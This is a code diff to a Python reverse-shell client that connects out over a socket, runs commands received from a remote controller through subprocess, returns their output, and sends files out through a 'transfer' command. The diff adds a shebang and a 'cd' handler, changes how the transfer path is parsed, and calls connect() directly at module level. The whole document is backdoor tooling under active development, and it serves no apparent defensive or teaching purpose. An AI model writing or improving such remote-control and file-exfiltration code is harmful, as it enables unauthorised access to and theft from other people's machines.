@@ -1,3 +1,5 @@
+#!/usr/bin/env python
+ 
 import socket 
 import subprocess 
 import os 
@@ -29,8 +31,11 @@ def connect():
             s.close()
             break
 
+        elif 'cd ' in command:
+            os.chdir(command[3:])
+
         elif 'transfer' in command: 
-            path = command.split(' ')[1]
+            path = command.split('&')[1]
             
             try: 
                 transfer(s,path)
@@ -43,6 +48,5 @@ def connect():
             s.send(CMD.stdout.read()) 
             s.send(CMD.stderr.read()) 
 
-def main ():
-    connect()
-main()
+connect()
+
